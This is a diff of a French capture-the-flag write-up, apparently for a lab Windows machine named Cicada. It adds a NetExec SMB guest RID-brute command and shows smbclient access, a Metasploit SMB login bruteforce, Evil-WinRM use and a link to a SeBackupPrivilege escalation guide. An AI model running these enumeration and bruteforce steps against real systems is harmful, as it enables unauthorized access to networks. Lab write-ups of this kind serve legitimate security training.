@@ -288,7 +288,12 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 293.43 seconds
            Raw packets sent: 131207 (5.773MB) | Rcvd: 151 (6.628KB)
 ```
+
+```bash
+nxc smb 10.10.11.35 -u guest -p '' --rid-brute --shares
 ```
+
+```bash
 smbclient //10.10.11.35/HR 
 Password for [WORKGROUP\keylloger]:
 Try "help" to get a list of possible commands.
@@ -298,7 +303,9 @@ smb: \> ls
   Notice from HR.txt                  A     1266  Wed Aug 28 19:31:48 2024
 ```
 
-```
+On y voit un mot de passe sans nom d'utilisateur
+
+```bash
 msf6 auxiliary(scanner/smb/smb_login) > exploit
 
 [*] 10.10.11.35:445       - 10.10.11.35:445 - Starting SMB login bruteforce
@@ -397,8 +404,10 @@ $backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileNa
 Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
 Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
 ```
+Pour la privesc je vous redirige vers ceci : https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/?source=post_page-----0ebda6a51519--------------------------------
 
-```*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> mkdir Temp
+```powershell
+Evil-WinRM* PS C:\Users\emily.oscars.CICADA> mkdir Temp
 
 
     Directory: C:\Users\emily.oscars.CICADA
